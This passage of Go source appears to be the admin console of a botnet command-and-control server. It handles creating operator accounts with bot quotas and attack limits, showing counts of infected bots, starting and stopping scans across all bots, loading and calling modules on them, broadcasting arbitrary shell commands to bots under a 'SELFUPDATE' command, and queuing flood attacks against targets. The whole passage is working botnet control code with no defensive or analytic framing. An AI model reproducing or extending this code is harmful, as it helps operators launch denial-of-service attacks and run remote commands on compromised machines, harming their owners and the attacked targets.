			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "ZTRANSF" {
			locipaddress, err := getToolIP("Domain (without www)")
			if err != nil {
				return
			}
			out, err := runLocalCmd("dig", "axfr", locipaddress)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}
		if userInfo.admin == 1 && cmd == "*ADDADMIN*" || cmd == "*addadmin*" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;97m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPassword:\033[01;97m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;97m(\033[0m-1 for access to all\033[01;97m)\033[0m:\033[01;97m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAttack Duration\033[01;97m(\033[0m-1 for none\033[01;97m)\033[0m:\033[01;97m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;97m(\033[0m0 for none\033[01;97m)\033[0m:\033[01;97m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;97m" + new_un + "\r\n\033[0m- Password - \033[01;97m" + new_pw + "\r\n\033[0m- Bots - \033[01;97m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;97m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;97m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;97m(\033[01;91my\033[01;97m/\033[038;5;202mn\033[01;97m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "rmuser" || cmd == "RMUSER" {
			this.conn.Write([]byte("\033[038;5;202mUsername: \033[0;97m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[01;91mAre You Sure You Want To Remove \033[01;97m" + rm_un + "?\033[038;5;202m(\033[01;32my\033[038;5;202m/\033[038;5;202mn\033[038;5;202m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;91mUnable to remove users\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;92mUser Successfully Removed!\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "adduser" || cmd == "ADDUSER" {
			this.conn.Write([]byte("enter new username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("enter new password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("enter wanted bot count (-1 for full net): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("max attack duration (-1 for none): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("cooldown time (0 for none): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("new account info: \r\nusername: " + new_un + "\r\npassword: " + new_pw + "\r\nbotcount: " + max_bots_str + "\r\nadd user to table? (y/n) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\x1b[38;5;202muser added successfully!\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && (cmd == "BOTS" || cmd == "bots") {
			botCount = clientList.Count()
			m := clientList.Distribution()
			this.conn.Write([]byte("\x1b[38;5;202m--- distribution ---\x1b[0m\r\n"))
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  %s: \x1b[1;97m%d\r\n", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mTotal: \x1b[1;97m%d\x1b[0m\r\n", botCount)))
			continue
		}
		if userInfo.admin == 1 && (cmd == "USERS" || cmd == "users") {
			users, err := database.GetUsers()
			if err != nil {
				this.conn.Write([]byte("\x1b[91mError\x1b[0m\r\n"))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;202muser            max_bots  admin  dur   cd\x1b[0m\r\n"))
			for _, u := range users {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;240m%-15s %8s %5s %5s %4s\x1b[0m\r\n",
					u["user"], u["max_bots"], u["admin"], u["duration"], u["cooldown"])))
			}
			continue
		}
		if userInfo.admin == 0 && (cmd == "BOTS" || cmd == "bots") {
			online := clientList.Count()
			if userInfo.maxBots != -1 && online > userInfo.maxBots {
				online = userInfo.maxBots
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mBots online: \x1b[1;97m%d\x1b[0m\r\n", online)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("failed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("bot count to send is bigger than allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		if baseCmd == "SCAN" || baseCmd == "SCANSTART" {
			if userInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			clientList.QueueBuf(BuildScanStart(), -1, "")
			this.conn.Write([]byte("\x1b[38;5;202mScan started on all bots\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "SCANSTOP" {
			if userInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			clientList.QueueBuf(BuildScanStop(), -1, "")
			this.conn.Write([]byte("\x1b[38;5;202mScan stopped on all bots\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "STOP" || baseCmd == "ATTACKSTOP" {
			if userInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			clientList.QueueBuf(BuildAttackStop(), -1, "")
			this.conn.Write([]byte("\x1b[38;5;202mAttacks stopped on all bots\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "UPDATE" && userInfo.admin == 1 {
			handleUpdateCommand(this, toolArg)
			continue
		}
		if baseCmd == "UPDATE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "SENDMODULE" && userInfo.admin == 1 {
			tokens := strings.Split(toolArg, " ")
			msg := handleSendModuleCommand(this, tokens)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "SENDMODULE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "CALLMODULE" && userInfo.admin == 1 {
			tokens := strings.Split(toolArg, " ")
			msg := handleCallModuleCommand(this, tokens)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "CALLMODULE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "LISTMODULES" && userInfo.admin == 1 {
			msg := handleListModulesCommand(this, nil)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "LISTMODULES" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}

		if baseCmd == "SELFUPDATE" && userInfo.admin == 1 {
			shellCmd := toolArg
			if shellCmd == "" {
				this.conn.Write([]byte("\x1b[96mCommand\x1b[97m: \x1b[97m"))
				var err error
				shellCmd, err = this.ReadLine(false)
				if err != nil || shellCmd == "" {
					this.conn.Write([]byte("\x1b[91mempty command\x1b[0m\r\n"))
					continue
				}
			}
			atk := &Attack{
				Duration: 0,
				Type:     255,
				Targets:  map[uint32]uint8{0: 32},
				Flags:    map[uint8]string{29: shellCmd},
			}
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", err.Error())))
				continue
			}
			clientList.QueueBuf(buf, botCount, botCatagory)
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mSent to %d bots\x1b[0m\r\n", botCount)))
			continue
		}

		if baseCmd == "SELFUPDATE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", err.Error())))
				} else if database.ContainsWhitelistedTargets(atk) {
					this.conn.Write([]byte("\x1b[91mTarget in whitelist, blocked\x1b[0m\r\n"))
					fmt.Println("blocked attack by " + username + " to whitelisted prefix")
				} else {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;34mSent to %d bots\x1b[0m\r\n", botCount)))
				}
			}
		}
	}
}

func runLocalCmd(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return strings.TrimSpace(out.String()), err
}

func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0
	cursorPos := 0
	histIdx := -1

	readByte := func() (byte, error) {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return 0, err
		}
		return buf[bufPos], nil
	}

	redrawLine := func(s string) {
		this.conn.Write([]byte("\r\033[K"))
		this.R.PromptUser(this.username)
		this.conn.Write([]byte(s))
	}

	moveCursorBack := func(n int) {
		for i := 0; i < n; i++ {
			this.conn.Write([]byte("\b"))
		}
	}

	for {
		b, err := readByte()
		if err != nil {
			return "", err
		}

		if b == '\xFF' {
			nb := make([]byte, 2)
			if n, _ := this.conn.Read(nb); n == 2 && cursorPos > 0 {
				copy(buf[cursorPos-1:], buf[cursorPos:bufPos])
				bufPos--
				cursorPos--
				if cursorPos == bufPos {
					this.conn.Write([]byte("\b \b"))
				} else {
					redrawLine(string(buf[:bufPos]))
					moveCursorBack(bufPos - cursorPos)
				}
			}
			continue
		}
		if b == '\x7F' || b == '\x08' {
			if cursorPos > 0 {
				copy(buf[cursorPos-1:], buf[cursorPos:bufPos])
				bufPos--
				cursorPos--
				if cursorPos == bufPos {
					this.conn.Write([]byte("\b \b"))
				} else {
					redrawLine(string(buf[:bufPos]))
					moveCursorBack(bufPos - cursorPos)
				}
			}
			continue
		}
		if b == '\r' || b == '\t' {
			continue
		}
		if b == '\n' || b == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		}
		if b == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		}
		if b == '\x1B' {
			seq := make([]byte, 4)
			this.conn.Read(seq)
			if len(seq) >= 2 && seq[0] == '[' {
				if seq[1] == 'A' && history != nil && len(*history) > 0 {
					if histIdx < len(*history)-1 {
						histIdx++
						line := (*history)[len(*history)-1-histIdx]
						bufPos = copy(buf, line)
						cursorPos = bufPos
						redrawLine(line)
					}
					continue
				}
				if seq[1] == 'B' && history != nil && histIdx > -1 {
					histIdx--
					if histIdx >= 0 {
						line := (*history)[len(*history)-1-histIdx]
						bufPos = copy(buf, line)
						cursorPos = bufPos
						redrawLine(line)
					} else {
						histIdx = -1
						bufPos = 0
						cursorPos = 0
						redrawLine("")
					}
					continue
				}
				if seq[1] == 'C' {
					if cursorPos < bufPos {
						if masked {
							this.conn.Write([]byte("*"))
						} else {
							this.conn.Write([]byte{buf[cursorPos]})
						}
						cursorPos++
					}
					continue
				}
				if seq[1] == 'D' {
					if cursorPos > 0 {
						cursorPos--
						this.conn.Write([]byte("\b"))
					}
					continue
				}
			}
			continue
		}

		if bufPos < len(buf)-1 {
			if cursorPos < bufPos {
				copy(buf[cursorPos+1:], buf[cursorPos:bufPos])
				buf[cursorPos] = b
				bufPos++
				tail := string(buf[cursorPos:bufPos])
				cursorPos++
				if masked {
					this.conn.Write(bytes.Repeat([]byte("*"), len(tail)))
				} else {
					this.conn.Write([]byte(tail))
				}
				moveCursorBack(bufPos - cursorPos)
			} else {
				buf[bufPos] = b
				bufPos++
				cursorPos++
				if masked {
					this.conn.Write([]byte("*"))
				} else {
					this.conn.Write([]byte{b})
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	return this.ReadLineWithHistory(masked, nil)
}
